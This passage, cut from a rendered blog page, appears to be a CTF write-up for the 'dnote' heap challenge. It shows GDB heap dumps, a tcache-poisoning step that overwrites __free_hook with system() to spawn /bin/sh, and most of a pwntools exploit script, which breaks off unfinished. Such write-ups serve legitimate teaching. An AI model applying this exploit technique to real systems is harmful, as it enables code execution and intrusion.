0x0000000000000111\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb40:   0x0000000000cac4bc  0x0000000000cac010    \u003c-- Tcache\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb50:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb60:   0x0000000000000000  0x00000000000000e1\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb70:   0x00007f43934d0c00  0x00007f43934d0c00    \u003c-- Unsorted bin\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb80:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb90:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacba0:   0x0000000000000000  0x0000000000000000\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"It malloc successfully, let\\u2019s check if everything is on the right path or not:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`gef\\u27A4  x/50xg 0x0000000000caca20\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca20:   0x0000000000000000  0x0000000000000141\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca30:   0x0000000000000000  0x0000000000000000    \u003c-- New chunk from unsorted bin\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca40:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca50:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca60:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca70:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca80:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcaca90:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacaa0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacab0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacac0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacad0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacae0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacaf0:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb00:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb10:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb20:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb30:   0x0000000000000000  0x0000000000000111\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb40:   0x00007f43934d37cc  0x0000000000ca000a    \u003c-- Forward pointer changed\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb50:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb60:   0x0000000000000000  0x00000000000000e1\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb70:   0x00007f43934d0c00  0x00007f43934d0c00    \u003c-- Unsorted bin\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb80:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacb90:   0x0000000000000000  0x0000000000000000\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`0xcacba0:   0x0000000000000000  0x0000000000000000\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We can see that it\\u2019s the correct position for our fake forward pointer. Let\\u2019s see if it\\u2019s the address of \",(0,n.jsx)(e.code,{children:\"__free_hook\"}),\" or not:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/check_free_hook_address.png\",alt:\"check_free_hook_address.png\"})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/free_hook_address.png\",alt:\"free_hook_address.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"That\\u2019s correct. Let\\u2019s move on the final stage to get shell!\"}),`\n`,(0,n.jsxs)(e.h3,{id:\"stage-4-overwrite-__free_hook-with-system\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-4-overwrite-__free_hook-with-system\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Stage 4: Overwrite \",(0,n.jsx)(e.code,{children:\"__free_hook\"}),\" with system()\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Now, we just need to malloc 2 chunk with the same size as 0x100 to get the address from tcache and with second malloc, we will overwrite the address of system to that. With the first chunk, we will put the string \",(0,n.jsx)(e.code,{children:\"/bin/sh\"}),' into it so we just reuse this chunk to execute system(\"/bin/sh\"):']}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`add(11, 0x100, b'/bin/sh')\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`add(12, 0x100, p64(libc.sym['system']))\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"And finally, we free() chunk index 11 and get shell:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsx)(e.code,{className:\"code-highlight\",children:(0,n.jsx)(e.span,{className:\"code-line\",children:`free(11)\n`})})}),`\n`,(0,n.jsx)(e.p,{children:\"Full code:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"#!/usr/bin/env python3\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"from\"}),\" pwn \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"exe \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./dnote_patched\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" checksec\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"libc \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./libc-2.32.so\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" checksec\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"ld \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./ld-2.32.so\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" checksec\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"False\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"context\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"binary \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),` exe\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"context\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"log_level \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'debug'\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"add\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'\u003e\u003e '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'1'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'no : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'size : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'Name : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"show\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'\u003e\u003e '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'2'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'no : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recvuntil\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\n'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" drop\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"free\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'\u003e\u003e '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'3'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'no : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"p\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\"process\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'./dnote_patched'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# p = connect('chall.nitdgplug.org', 30094)\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"########################################\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"### Stage 1: Leak main arena address ###\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"########################################\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x1000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x1100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"ljust\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x1c5220\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"log\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Libc base: \"'}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"##################################\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"### Stage 2: Leak heap address ###\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"##################################\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"ljust\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003c\u003c\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"log\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Heap base: \"'}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"add\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'{}'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"format\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token 